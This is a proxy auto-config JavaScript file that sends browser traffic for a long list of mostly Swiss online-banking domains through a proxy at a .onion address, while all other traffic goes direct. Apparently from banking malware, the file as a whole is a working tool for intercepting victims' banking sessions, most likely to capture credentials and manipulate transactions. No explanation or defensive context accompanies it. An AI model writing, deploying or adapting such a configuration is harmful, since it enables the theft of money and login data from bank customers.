function FindProxyForURL(url, host) {
    var proxy = "PROXY aztqlm4tslmpgkau.onion:5588;";
    var hosts = new Array('*.postfinance.ch', 'cs.directnet.com', '*akb.ch',
        '*ubs.com', 'tb.raiffeisendirect.ch', '*bkb.ch', '*lukb.ch',
        '*zkb.ch', '*onba.ch', '*gkb.ch', '*bekb.ch', '*zugerkb.ch',
        '*bcge.ch', '*raiffeisen.ch', '*credit-suisse.com', '*.clientis.ch',
        'clientis.ch', '*bcvs.ch', '*.cic.ch', 'cic.ch', '*baloise.ch',
        'ukb.ch', '*.ukb.ch', 'urkb.ch', '*.urkb.ch', '*eek.ch', '*szkb.ch',
        '*shkb.ch', '*glkb.ch', '*nkb.ch', '*owkb.ch', '*cash.ch',
        '*bcf.ch', 'ebanking.raiffeisen.ch', '*bcv.ch', '*juliusbaer.com',
        '*abs.ch', '*bcn.ch', '*blkb.ch', '*bcj.ch', '*zuercherlandbank.ch',
        '*valiant.ch', '*wir.ch', '*bankthalwil.ch', '*piguetgalland.ch',
        '*triba.ch', '*inlinea.ch', '*bernerlandbank.ch',
        '*bancasempione.ch', '*bsibank.com', '*corneronline.ch',
        '*vermoegenszentrum.ch', '*gobanking.ch', '*slbucheggberg.ch',
        '*slfrutigen.ch', '*hypobank.ch', '*regiobank.ch', '*rbm.ch',
        '*hbl.ch', '*ersparniskasse.ch', '*ekr.ch',
        '*sparkasse-dielsdorf.ch', '*eki.ch', '*bankgantrisch.ch',
        '*bbobank.ch', '*alpharheintalbank.ch', '*aekbank.ch',
        '*acrevis.ch', '*credinvest.ch', '*bancazarattini.ch', '*appkb.ch',
        '*arabbank.ch', '*apbank.ch', '*notenstein-laroche.ch',
        '*bankbiz.ch', '*bankleerau.ch', '*btv3banken.ch', '*dcbank.ch',
        '*bordier.com', '*banquethaler.com', '*bankzimmerberg.ch',
        '*bbva.ch', '*bankhaus-jungholz.ch', '*sparhafen.ch',
        '*banquecramer.ch', '*banqueduleman.ch', '*bcpconnect.com',
        '*bil.com', '*vontobel.com', '*pbgate.net', '*bnpparibas.com',
        '*ceanet.ch', '*ce-riviera.ch', '*cedc.ch', '*cmvsa.ch',
        '*ekaffoltern.ch', '*glarner-regionalbank.ch', '*cen.ch',
        '*cbhbank.com', '*coutts.com', '*cimbanque.net', '*cembra.ch',
        '*commerzbank.com', '*dominickco.ch', '*efginternational.com',
        '*exane.com', '*falconpb.com', '*gemeinschaftsbank.ch',
        '*frankfurter-bankgesellschaft.com', '*globalance-bank.com',
        '*ca-financements.ch', '*hsbcprivatebank.com',
        '*leihkasse-stammheim.ch', '*incorebank.ch', '*lienhardt.ch',
        '*mmwarburg.ch', '*maerki-baumann.ch', '*mirabaud.com',
        '*nordea.ch', '*pbihag.ch', '*rahnbodmer.ch', '*mybancaria.ch',
        '*reyl.com', '*saanenbank.ch', '*sebgroup.com', '*slguerbetal.ch',
        '*bankslm.ch', '*neuehelvetischebank.ch', '*slr.ch',
        '*slwynigen.ch', '*sparkasse.ch', '*umtb.ch', '*trafina.ch',
        '*ubp.com');
    for (var i = 0; i < hosts.length; i++) {
        if (shExpMatch(host, hosts[i])) {
            return proxy
        }
    }
    return "DIRECT"
}
